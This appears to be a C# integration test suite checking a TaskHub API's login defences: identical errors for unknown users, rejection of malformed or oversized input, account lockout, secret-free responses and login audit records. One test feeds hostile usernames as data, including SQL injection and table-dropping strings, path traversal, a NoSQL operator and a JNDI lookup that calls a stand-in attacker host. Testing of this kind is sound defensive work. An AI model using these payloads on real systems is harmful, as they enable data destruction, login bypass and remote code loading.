using System.Net;
using TaskHub.Application.Dtos.Admin;
using TaskHub.Application.Dtos.Audit;
using TaskHub.Application.Dtos.Auth;
using TaskHub.Application.Dtos.Common;
using TaskHub.Domain.Enums;
using TaskHub.IntegrationTests.Support;

namespace TaskHub.IntegrationTests.Security;

/// <summary>
/// Signing in: wrong credentials, guessing, lockout after repeated failures and what the answers give away.
/// </summary>
public class LoginSecurityTests : IClassFixture<TaskHubApiFactory>
{
    private readonly TaskHubApiFactory _factory;

    public LoginSecurityTests(TaskHubApiFactory factory)
    {
        _factory = factory;
    }

    [Fact]
    public async Task Login_ReturnsATokenThatOpensTheApi()
    {
        var user = await _factory.CreateUserAsync();

        var login = await _factory.Anonymous().PostAsync<LoginResponse>(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });

        Assert.False(login.RequiresTwoFactor);
        Assert.NotNull(login.AccessToken);
        Assert.True(login.ExpiresAt > DateTimeOffset.UtcNow);
        Assert.Equal(user.UserId, login.User!.Id);

        var me = await _factory.WithToken(login.AccessToken).GetAsync(ApiRoutes.Me);
        await me.ShouldBeAsync(HttpStatusCode.OK);
    }

    [Fact]
    public async Task WrongPasswordAndUnknownUser_AreAnsweredTheSame()
    {
        // Otherwise the login form tells an attacker which user names exist.
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();

        var wrongPassword = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = "Wrong-Passw0rd-1" });
        var unknownUser = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = $"nobody{Guid.NewGuid():N}", Password = "Wrong-Passw0rd-1" });

        var wrongPasswordErrors = await wrongPassword.ReadErrorsAsync(HttpStatusCode.Unauthorized);
        var unknownUserErrors = await unknownUser.ReadErrorsAsync(HttpStatusCode.Unauthorized);

        Assert.Equal(wrongPasswordErrors, unknownUserErrors);
    }

    [Theory]
    [InlineData("' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("admin\" OR \"\"=\"")]
    [InlineData("'; DROP TABLE AspNetUsers;--")]
    [InlineData("admin' UNION SELECT * FROM AspNetUsers--")]
    [InlineData("*")]
    [InlineData("%")]
    [InlineData("admin%")]
    [InlineData("ADMIN\0")]
    [InlineData("../../admin")]
    [InlineData("${jndi:ldap://attacker.example/a}")]
    [InlineData("{\"$ne\": null}")]
    public async Task Login_TreatsInjectionAttemptsAsAnUnknownUser(string userName)
    {
        // A user of its own, so the failed attempt does not count towards locking an account other tests use.
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();

        var asUserName = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = userName, Password = userName });
        var asPassword = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = userName });

        await asUserName.ShouldBeAsync(HttpStatusCode.Unauthorized);
        await asPassword.ShouldBeAsync(HttpStatusCode.Unauthorized);

        // The users table survived whatever was sent.
        var admin = await _factory.AdminAsync();
        var users = await admin.GetAsync(ApiRoutes.AdminUsers);
        await users.ShouldBeAsync(HttpStatusCode.OK);
    }

    [Theory]
    [InlineData("{}")]
    [InlineData("{\"userName\":\"admin\"}")]
    [InlineData("{\"password\":\"admin\"}")]
    [InlineData("{\"userName\":\"\",\"password\":\"\"}")]
    [InlineData("{\"userName\":null,\"password\":null}")]
    [InlineData("{\"userName\":{\"$ne\":null},\"password\":{\"$ne\":null}}")]
    [InlineData("{\"userName\":[\"admin\"],\"password\":[\"admin\"]}")]
    [InlineData("{\"userName\":true,\"password\":true}")]
    [InlineData("[]")]
    [InlineData("null")]
    [InlineData("not json")]
    [InlineData("")]
    public async Task Login_RejectsAMalformedRequest(string body)
    {
        var content = new StringContent(body, System.Text.Encoding.UTF8, "application/json");

        var response = await _factory.Anonymous().Client.PostAsync(ApiRoutes.Login, content);

        await response.ShouldBeAsync(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Login_RejectsOversizedCredentials()
    {
        var anonymous = _factory.Anonymous();

        var longUserName = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = new string('a', 257), Password = "x" });
        var longPassword = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = "admin", Password = new string('a', 129) });

        await longUserName.ShouldBeAsync(HttpStatusCode.BadRequest);
        await longPassword.ShouldBeAsync(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Login_DoesNotMatchThePasswordLoosely()
    {
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();
        var candidates = new[]
        {
            user.Password.ToUpperInvariant(),
            user.Password.ToLowerInvariant(),
            user.Password + " ",
            " " + user.Password,
            user.Password[..^1],
            user.Password + "1"
        };

        foreach (var candidate in candidates)
        {
            // Each account gets its own guesses so the lockout does not decide the outcome.
            var response = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = candidate });
            await response.ShouldBeAsync(HttpStatusCode.Unauthorized);

            await UnlockAsync(user);
        }
    }

    [Fact]
    public async Task Login_AnswersContainNoSecrets()
    {
        var user = await _factory.CreateUserAsync();
        var admin = await _factory.AdminAsync();

        var login = await _factory.Anonymous().PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });
        var me = await user.GetAsync(ApiRoutes.Me);
        var adminList = await admin.GetAsync(ApiRoutes.AdminUsers);
        var directory = await user.GetAsync(ApiRoutes.Users);

        foreach (var response in new[] { login, me, adminList, directory })
        {
            var body = await response.Content.ReadAsStringAsync();

            await response.ShouldBeAsync(HttpStatusCode.OK);
            Assert.DoesNotContain("passwordHash", body, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("securityStamp", body, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("concurrencyStamp", body, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("tokenVersion", body, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain(user.Password, body);
            Assert.DoesNotContain(TaskHubApiFactory.AdminPassword, body);
        }
    }

    [Fact]
    public async Task RepeatedFailures_LockTheAccount_EvenForTheRightPassword()
    {
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();

        for (var attempt = 0; attempt < TaskHubApiFactory.MaxFailedAccessAttempts; attempt++)
        {
            var failed = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = "Wrong-Passw0rd-1" });
            await failed.ShouldBeAsync(HttpStatusCode.Unauthorized);
        }

        var withRightPassword = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });
        await withRightPassword.ShouldBeAsync(HttpStatusCode.Unauthorized);

        // A session opened before the lockout ends with it.
        var existingSession = await user.GetAsync(ApiRoutes.Me);
        await existingSession.ShouldBeAsync(HttpStatusCode.Unauthorized);

        var admin = await _factory.AdminAsync();
        var users = await admin.GetAsync<List<AdminUserDto>>(ApiRoutes.AdminUsers);
        Assert.True(users.Single(existing => existing.Id == user.UserId).LockedOut);
    }

    [Fact]
    public async Task AdministratorUnlock_LetsTheUserSignInAgain()
    {
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();

        for (var attempt = 0; attempt < TaskHubApiFactory.MaxFailedAccessAttempts; attempt++)
        {
            await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = "Wrong-Passw0rd-1" });
        }

        await UnlockAsync(user);

        var login = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });
        await login.ShouldBeAsync(HttpStatusCode.OK);
    }

    [Fact]
    public async Task FewerFailuresThanTheLimit_DoNotLockTheAccount()
    {
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();

        for (var attempt = 0; attempt < TaskHubApiFactory.MaxFailedAccessAttempts - 1; attempt++)
        {
            await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = "Wrong-Passw0rd-1" });
        }

        var login = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });
        await login.ShouldBeAsync(HttpStatusCode.OK);
    }

    [Fact]
    public async Task SuccessfulLogin_ResetsTheFailureCounter()
    {
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();

        for (var round = 0; round < 3; round++)
        {
            for (var attempt = 0; attempt < TaskHubApiFactory.MaxFailedAccessAttempts - 1; attempt++)
            {
                await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = "Wrong-Passw0rd-1" });
            }

            var login = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });
            await login.ShouldBeAsync(HttpStatusCode.OK);
        }
    }

    [Fact]
    public async Task FailuresOnOneAccount_DoNotLockAnother()
    {
        var target = await _factory.CreateUserAsync("target");
        var bystander = await _factory.CreateUserAsync("bystander");
        var anonymous = _factory.Anonymous();

        for (var attempt = 0; attempt < TaskHubApiFactory.MaxFailedAccessAttempts + 2; attempt++)
        {
            await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = target.UserName, Password = "Wrong-Passw0rd-1" });
        }

        var login = await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = bystander.UserName, Password = bystander.Password });
        var session = await bystander.GetAsync(ApiRoutes.Me);

        await login.ShouldBeAsync(HttpStatusCode.OK);
        await session.ShouldBeAsync(HttpStatusCode.OK);
    }

    [Fact]
    public async Task FailedAndSuccessfulLogins_AreRecordedForTheAdministrator()
    {
        var user = await _factory.CreateUserAsync();
        var anonymous = _factory.Anonymous();
        var ghost = $"ghost{Guid.NewGuid():N}";

        await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = "Wrong-Passw0rd-1" });
        await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = ghost, Password = "Wrong-Passw0rd-1" });
        await anonymous.PostAsync(ApiRoutes.Login, new LoginRequest { UserName = user.UserName, Password = user.Password });

        var admin = await _factory.AdminAsync();
        var userLogs = await admin.GetAsync<PagedResultDto<LoginLogDto>>($"{ApiRoutes.AdminLoginLogs}?search={user.UserName}&pageSize=100");
        var ghostLogs = await admin.GetAsync<PagedResultDto<LoginLogDto>>($"{ApiRoutes.AdminLoginLogs}?search={ghost}");

        Assert.Contains(userLogs.Items, log => !log.Succeeded && log.FailureReason == LoginFailureReason.InvalidPassword && log.UserId == user.UserId);
        Assert.Contains(userLogs.Items, log => log.Succeeded && log.UserId == user.UserId);

        var ghostLog = Assert.Single(ghostLogs.Items);
        Assert.False(ghostLog.Succeeded);
        Assert.Equal(LoginFailureReason.UserNotFound, ghostLog.FailureReason);
        Assert.Null(ghostLog.UserId);
    }

    [Fact]
    public async Task OwnLoginHistory_ShowsOnlyTheCallersLogins()
    {
        var user = await _factory.CreateUserAsync("history");
        var other = await _factory.CreateUserAsync("other");
        await _factory.LoginAsync(other);

        var logins = await user.GetAsync<PagedResultDto<LoginLogDto>>($"{ApiRoutes.MyLogins}?pageSize=200");

        Assert.NotEmpty(logins.Items);
        Assert.All(logins.Items, log => Assert.Equal(user.UserId, log.UserId));

        // Asking for somebody else by name does not widen the result.
        var searched = await user.GetAsync<PagedResultDto<LoginLogDto>>($"{ApiRoutes.MyLogins}?search={other.UserName}&userId={other.UserId}");
        Assert.All(searched.Items, log => Assert.Equal(user.UserId, log.UserId));
    }

    private async Task UnlockAsync(ApiSession user)
    {
        var admin = await _factory.AdminAsync();
        var response = await admin.PutAsync(ApiRoutes.AdminUserLockout(user.UserId), new SetUserLockoutRequest { LockedOut = false });

        await response.ShouldBeAsync(HttpStatusCode.OK);
    }
}
